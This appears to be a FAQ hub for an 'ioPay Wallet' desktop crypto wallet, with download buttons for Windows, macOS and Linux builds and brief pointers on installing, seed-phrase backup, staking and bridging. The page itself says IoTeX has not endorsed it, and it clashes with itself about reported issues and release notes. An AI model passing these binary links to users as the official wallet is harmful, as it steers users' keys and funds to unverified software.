![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Wallet: Frequently Asked Questions for New Users

Twelve questions, each answered in two sentences and linked to the page that owns the detail. This is a hub, not a summary - if an answer here ever disagrees with its owning article, the article wins.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## What is it?

**A desktop wallet for IoTeX** - Windows, macOS and Linux, published as *Iopay Wallet Desktop*. It holds your keys locally and reaches staking, bridging, swapping and DePIN income from one window. [The product page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/what-is-iopay-wallet.md).

## Which version is current?

The problems users reported were fixed in v2.0.2, which makes the version check the first troubleshooting step as well as the first install step.

**v2.0.2, published 19 November 2026.** Anything earlier is an old build. [Versions and release notes](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-versions-and-release-notes.md).

## How do I install it?

From the release page, with one asset per platform: `.exe`, `.dmg`, `.zip`. [Windows](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/install-iopay-wallet-on-windows.md), and the macOS and Linux guides alongside it.

## How do I back it up?

Write the **12- or 24-word phrase** on paper, store it away from the device, and test a restore before you fund anything. [Backup guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md).

## Why do I have two addresses?

Every IoTeX account has an `io1...` native address and a `0x...` EVM address; both are the same key. [Explained once](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md).

## Do I need an account or password?

No. There is no login - only an app-lock PIN in front of the local key store, and no one can reset it for you.

## What do I need to stake?

A validator, an amount and a duration - and the minimum, the duration limit and the stake-lock decision all have exact values on [the staking page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md). They are not repeated here, because a hub that restates parameters is how two versions of them start disagreeing.

## How long does unstaking take?

Longer than a transaction, and it is a sequence rather than a button. The timing, the countdown and the two-step exit are on [the unstaking page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md).

## What is burn-drop?

A chain mechanism where **device activation burns IOTX and restakes it to qualified staking buckets** - not a per-device payout and not a claim from a website. [Burn-drop](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-burn-drop-rewards-in-iopay.md).

## Is it endorsed by IoTeX?

**No endorsement is published**, and none is claimed here. The code is public under Apache-2.0, which is what you can actually check.

## Where do I get help?

There is no support desk: the repository has no issue history. Work the documented fixes first, then report through the repository if it offers a channel. [Getting help](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-to-get-help-with-iopay-wallet.md).

## What should I do first?

In this order: install, back up, test the restore, then fund. Staking and bridging come after the backup is proven, not before.

## A note on what this page is not

It is not a summary of the sixty-two articles in this project, and it deliberately does not restate their detail. Each answer above is a pointer, and the pointer is the point: a hub that duplicates its own pages is how two versions of a fact start disagreeing.

It also makes no claim that is not already made in one of those pages - no price, no yield, no endorsement, no audit result.

## If you are new, read in this order

The order matters more than the individual pages, because two of these steps are the ones people skip and later regret:

1. **What the product is** - [the product page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/what-is-iopay-wallet.md).
2. **Install** - one asset for your platform; [Windows](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/install-iopay-wallet-on-windows.md), with the macOS and Linux guides beside it.
3. **Back up** - phrase on paper, offline, before any money arrives: [backup guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md).
4. **Test the restore** - into a throwaway account, so the backup stops being a hypothesis.
5. **Confirm both addresses** - `io1...` and `0x...` for every account: [addresses](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md).
6. **Then** stake, bridge or register a device.

Steps 3 and 4 decide whether everything after them is reversible. A missing backup is the one thing on this list that cannot be redone.

## Where to go by situation

| What you are doing | Start here |
|---|---|
| First install on a new machine | the system-requirements page, then the platform guide |
| Moving off a phone | the mobile-to-desktop page |
| Password or PIN rejected | the app-lock page |
| Balance looks wrong | the balance page |
| Transaction pending | the stuck-transactions page |
| Deciding whether to use it at all | the first-wallet page in the choosing hub |

## The questions that arrive a week later

**"Rewards are not in my balance."** They accrue to the staking position, not to spendable IOTX, until you claim or withdraw. [Staking](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) owns the detail.

**"The bridge said it worked but nothing arrived."** Delivery is a second transaction on the destination chain, and it needs gas there. [The bridge](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-use-the-iotube-bridge-in-iopay-wallet.md).

**"I updated and nothing looks different."** There are no release notes to compare against, so the version screen is the evidence. [Versions](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-versions-and-release-notes.md).

**"I have two entries for one address."** One is probably a watch-only entry and the other a full account: same address, different authority. [Watch-only](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/watch-only-addresses-in-iopay-wallet.md).


## What the app will not do for you

Three absences explain most of the confusion new users report. There is no password reset: the app-lock PIN protects one machine's copy of a key, and nobody, including the project, can restore it. There is no recovery desk: the phrase is the only route back into an account, which is why the backup step comes before funding rather than after. And no transaction can be withdrawn once a validator has included it, so the address check before a send matters more than any step taken afterwards.

## Reading a balance, a reward and a fee correctly

The figure on the main screen is spendable IOTX, not everything the account owns. A delegated amount leaves that figure for as long as it is staked, and rewards sit inside the staking position until they are claimed, so a smaller balance after delegating is arithmetic rather than loss. Fees are paid in IOTX on the chain where the transaction happens, which means a bridge carries a cost on this side and a second one on the destination chain. When those three numbers disagree with the total you expected, they are usually describing different things rather than reporting a fault. Each linked page below carries the exact mechanics for its own case.

## Related

- [What ioPay Wallet is](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/what-is-iopay-wallet.md)
- [Backup](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md)
- [Addresses](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md)
- [Staking](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md)
- [Unstaking](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md)
- [Burn-drop](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-burn-drop-rewards-in-iopay.md)
- [Versions](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-versions-and-release-notes.md)
- [Help](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-to-get-help-with-iopay-wallet.md)
